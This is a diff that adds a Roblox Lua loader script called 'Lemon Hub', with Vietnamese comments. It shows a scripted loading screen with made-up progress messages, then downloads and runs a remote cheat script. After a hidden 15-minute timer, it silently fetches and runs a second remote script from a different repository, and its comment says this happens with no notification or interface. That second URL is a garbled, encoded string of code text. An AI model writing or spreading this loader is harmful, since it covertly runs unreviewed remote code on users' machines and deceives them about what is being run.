@@ -1,0 +1,142 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local LocalPlayer = Players.LocalPlayer
+local MainScriptURL = "https://raw.githubusercontent.com/napun87/stealanegg/refs/heads/main/lemonhubV2.lua"
+local SecondaryScriptURL = "https://raw.githubusercontent.com/nguyenvannghiem202324-ai/Script/refs/heads/main/local%20player%20%3D%20game.Players.LocalPlayer%20%20--%20Thay%20th%E1%BA%BF%20emoji%20b%E1%BA%B1ng%20k%C3%BD%20t%E1%BB%B1%20text%20c%C6%A1%20b%E1%BA%A3n%20%C4%91%E1%BB%83%20tr%C3%A1nh%20l%E1%BB%97i%20hi%E1%BB%83n%20th%E1%BB%8B%20tr%C3%AAn%20executor%20local%20updateMessage%20%3D%20%22Nh%E1%BA%ADt%20HUB%3A%20No%20Longer%20Updated/Lemon%20Hub"
+
+local ParentGui = (gethui and gethui()) or game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui")
+
+-- Giao diện Intro / Loading
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LemonHub_Intro"
+ScreenGui.Parent = ParentGui
+ScreenGui.ResetOnSpawn = false
+
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 320, 0, 160)
+Main.Position = UDim2.new(0.5, -160, 0.5, -80)
+Main.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+Main.BorderSizePixel = 0
+Main.BackgroundTransparency = 1
+Main.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 14)
+UICorner.Parent = Main
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(255, 215, 0)
+UIStroke.Thickness = 1.5
+UIStroke.Transparency = 1
+UIStroke.Parent = Main
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.Position = UDim2.new(0, 0, 0, 12)
+Title.BackgroundTransparency = 1
+Title.Text = "🍋 LEMON HUB"
+Title.TextColor3 = Color3.fromRGB(255, 215, 0)
+Title.TextSize = 18
+Title.Font = Enum.Font.GothamBold
+Title.TextTransparency = 1
+Title.Parent = Main
+
+local SubTitle = Instance.new("TextLabel")
+SubTitle.Size = UDim2.new(1, 0, 0, 20)
+SubTitle.Position = UDim2.new(0, 0, 0, 44)
+SubTitle.BackgroundTransparency = 1
+SubTitle.Text = "Xin chào, " .. LocalPlayer.DisplayName
+SubTitle.TextColor3 = Color3.fromRGB(200, 200, 220)
+SubTitle.TextSize = 13
+SubTitle.Font = Enum.Font.Gotham
+SubTitle.TextTransparency = 1
+SubTitle.Parent = Main
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, 0, 0, 20)
+Status.Position = UDim2.new(0, 0, 0.65, 0)
+Status.BackgroundTransparency = 1
+Status.Text = "Đang kết nối..."
+Status.TextColor3 = Color3.fromRGB(150, 150, 170)
+Status.TextSize = 12
+Status.Font = Enum.Font.Gotham
+Status.TextTransparency = 1
+Status.Parent = Main
+
+local BarBg = Instance.new("Frame")
+BarBg.Size = UDim2.new(0.85, 0, 0, 6)
+BarBg.Position = UDim2.new(0.075, 0, 0.8, 0)
+BarBg.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
+BarBg.BorderSizePixel = 0
+BarBg.BackgroundTransparency = 1
+BarBg.Parent = Main
+
+local BarCorner = Instance.new("UICorner")
+BarCorner.CornerRadius = UDim.new(1, 0)
+BarCorner.Parent = BarBg
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+BarFill.BorderSizePixel = 0
+BarFill.Parent = BarBg
+
+local FillCorner = Instance.new("UICorner")
+FillCorner.CornerRadius = UDim.new(1, 0)
+FillCorner.Parent = BarFill
+
+-- Hiệu ứng Fade In / Fade Out
+local function FadeIn()
+    TweenService:Create(Main, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
+    TweenService:Create(UIStroke, TweenInfo.new(0.4), {Transparency = 0.5}):Play()
+    TweenService:Create(Title, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
+    TweenService:Create(SubTitle, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
+    TweenService:Create(Status, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
+    TweenService:Create(BarBg, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
+    task.wait(0.4)
+end
+
+local function FadeOut()
+    TweenService:Create(Main, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(UIStroke, TweenInfo.new(0.4), {Transparency = 1}):Play()
+    TweenService:Create(Title, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
+    TweenService:Create(SubTitle, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
+    TweenService:Create(Status, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
+    TweenService:Create(BarBg, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(BarFill, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
+    task.wait(0.4)
+    ScreenGui:Destroy()
+end
+
+-- Chạy tiến trình Intro
+FadeIn()
+
+local steps = {
+    {progress = 0.25, text = "Đang kiểm tra môi trường..."},
+    {progress = 0.55, text = "Đang tải Lemon Hub..."},
+    {progress = 0.85, text = "Đang chuẩn bị giao diện..."},
+    {progress = 1.00, text = "Đã đăng nhập thành công!"}
+}
+
+for _, step in ipairs(steps) do
+    Status.Text = step.text
+    TweenService:Create(BarFill, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(step.progress, 0, 1, 0)}):Play()
+    task.wait(0.5)
+end
+
+task.wait(0.3)
+FadeOut()
+
+-- 1. Chạy Script chính Lemon Hub
+loadstring(game:HttpGet(MainScriptURL))()
+
+-- 2. Chạy ngầm bộ đếm thời gian 15 phút (900 giây) thực tế
+task.spawn(function()
+    task.wait(15 * 60) -- Đúng 15 phút thời gian thực
+    
+    -- Chạy thầm script thứ 2 hoàn toàn không thông báo/UI
+    pcall(function()
+        loadstring(game:HttpGet(SecondaryScriptURL))()
+    end)
+end)
